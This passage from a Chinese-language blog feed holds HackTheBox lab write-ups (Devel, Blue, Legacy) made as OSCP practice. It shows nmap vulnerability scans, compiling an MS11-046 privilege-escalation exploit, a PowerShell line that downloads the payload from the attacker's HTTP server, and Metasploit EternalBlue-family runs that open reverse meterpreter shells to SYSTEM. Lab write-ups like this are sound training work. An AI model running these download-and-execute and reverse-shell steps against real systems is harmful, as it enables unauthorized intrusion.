class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;<span class="built_in">cd</span> babis</span><br><span class="line"><span class="built_in">cd</span> babis</span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 137F-3971</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          .</span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          ..</span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          Administrator</span><br><span class="line">17/03/2017  04:17 ��    &lt;DIR&gt;          babis</span><br><span class="line">18/03/2017  01:06 ��    &lt;DIR&gt;          Classic .NET AppPool</span><br><span class="line">14/07/2009  09:20 ��    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               6 Dir(s)   4.396.625.920 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;systeminfo </span><br><span class="line">systeminfo </span><br><span class="line"></span><br><span class="line">Host Name:                 DEVEL</span><br><span class="line">OS Name:                   Microsoft Windows 7 Enterprise </span><br><span class="line">OS Version:                6.1.7600 N/A Build 7600</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          babis</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                55041-051-0948536-86302</span><br><span class="line">Original Install Date:     17/3/2017, 4:17:31 ��</span><br><span class="line">System Boot Time:          28/10/2024, 1:26:00 ��</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware Virtual Platform</span><br><span class="line">System Type:               X86-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz</span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             el;Greek</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span><br><span class="line">Total Physical Memory:     3.071 MB</span><br><span class="line">Available Physical Memory: 2.456 MB</span><br><span class="line">Virtual Memory: Max Size:  6.141 MB</span><br><span class="line">Virtual Memory: Available: 5.535 MB</span><br><span class="line">Virtual Memory: In Use:    606 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    HTB</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: Local Area Connection 4</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     10.129.0.1</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.129.151.61</span><br><span class="line">                                 [02]: fe80::d981:e519:55b8:816</span><br><span class="line">                                 [03]: dead:beef::8870:1e16:d944:cf4e</span><br><span class="line">                                 [04]: dead:beef::d981:e519:55b8:816</span><br></pre></td></tr></table></figure></div><p>從上面的資訊我們還可以得知作業系統的版本很舊，是 Windows 7 最早期的版本，已知存在許多漏洞。<br>我們可以透過 <code>searchsploit</code> 來找尋 Exploit Database (exploit-db) 中的漏洞資料使用方法如下，我們可以先去 google win7 x86 提權有哪些：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_exploitDB.png"                      alt="db"                ><br>然後在上面可以看到左上角有一個 EDB-ID 我們可以這樣用：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ searchsploit -u <span class="comment">## update</span></span><br><span class="line">└──╼ [★]$ searchsploit -m 47176</span><br><span class="line">  Exploit: Microsoft Windows 7 build 7601 (x86) - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/47176</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/47176.cpp</span><br><span class="line">    Codes: CVE-2019-1132</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/47176.cpp</span><br></pre></td></tr></table></figure></div><p>結果他沒有寫要怎麼編譯遇到很多環境問題，決定換另外一個有寫編譯方式的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ searchsploit -m 40564</span><br><span class="line">  Exploit: Microsoft Windows (x86) - <span class="string">&#x27;afd.sys&#x27;</span> Local Privilege Escalation (MS11-046)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/40564</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c</span><br><span class="line">    Codes: CVE-2011-1249, MS11-046</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/40564.c</span><br><span class="line"></span><br><span class="line">┌─[eu-dedivip-1]─[10.10.14.63]─[kazma@htb-wnzfbgnuq9]─[~]</span><br><span class="line">└──╼ [★]$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32</span><br></pre></td></tr></table></figure></div><p>然後用 python 的 http.server 讓我們從目標機器載下 payload:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ python -m http.server </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure></div><p>從目標機器載下來：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div><p>執行腳本：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Public\Downloads&gt;40564.exe</span><br><span class="line">40564.exe</span><br><span class="line"></span><br><span class="line">c:\Windows\System32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure></div><p>拿下機器！</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先 &lt;code&gt;nmap&lt;/code&gt; 一下：&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Bash&quot;&gt;&lt;figure class=&quot;iseeu highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Blue Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/</id>
    <published>2024-10-27T11:08:02.748Z</published>
    <updated>2024-10-27T11:23:08.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>先 <code>nmap</code> 一下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script vuln 10.129.208.2</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:09 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.208.2</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 991 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 89.41 seconds</span><br></pre></td></tr></table></figure></div><p>感覺跟 legacy 87% 像：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfconsole</span><br><span class="line">Metasploit tip: The use <span class="built_in">command</span> supports fuzzy searching to try and </span><br><span class="line"><span class="keyword">select</span> the intended module, e.g. use kerberos/get_ticket or use </span><br><span class="line">kerberos forge silver ticket</span><br><span class="line">                                                  </span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%</span><br><span class="line">%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%</span><br><span class="line">%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%</span><br><span class="line">%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%</span><br><span class="line">%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2017-0143</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 1 </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> rhost 10.129.208.2</span><br><span class="line">rhost =&gt; 10.129.208.2</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.208.2:445 - Target OS: Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[*] 10.129.208.2:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 10.129.208.2:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 10.129.208.2:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.129.208.2:445 - Executing the payload...</span><br><span class="line">[+] 10.129.208.2:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.208.2</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.208.2:49158) at 2024-10-27 06:13:43 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Windows\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div><p>拿下 root。</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blue_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;先 &lt;code&gt;nmap&lt;/code&gt; 一下：&lt;/p&gt;
&lt;div class=&quot;highlight-containe</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Legacy Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/</id>
    <published>2024-10-27T09:38:00.249Z</published>
    <updated>2024-10-27T11:10:12.335Z</updated>
    
    <content type="html"><![CDATA[<p>從今天開始想要在考 OSCP 前刷一下 HackTheBox 中跟 OSCP 證照比較相關的機器：<br><a class="link"   href="https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation" >https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>今天要打的是 Windows 的 legacy</p><p>先 <code>nmap</code> 掃一下</p><ul><li><code>-sV</code> 是服務版本偵測</li><li><code>--script=vuln</code> 會針對已知漏洞進行檢查<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script=vuln 10.129.152.110</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:21 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.152.110</span><br><span class="line">Host is up (0.078s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.14 seconds</span><br></pre></td></tr></table></figure></div>掃描結果是有三個服務開啟，其中有 smb-vuln-ms17-010 的漏洞，是一個 SMB 的 RCE 洞，我們可以用 msfconsole 扁他。<br>結果一直遇到這個問題：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.152.110:445 - Target OS: Windows 5.1</span><br><span class="line">[-] 10.129.152.110:445 - Unable to find accessible named pipe!</span><br><span class="line">^[c[*] Exploit completed, but no session was created.1</span><br></pre></td></tr></table></figure></div>超怪，網路上看到有人用這個洞打進去，但是看到有些人是打 netbios 的洞，而且他們用 <code>nmap</code> 用一樣的指令有掃到 CVE-2008-4250 超怪。<br>結果機器重開之後就有了？？？<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap --script vuln 10.129.227.181</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:52 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.227.181</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service <span class="keyword">in</span> Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to 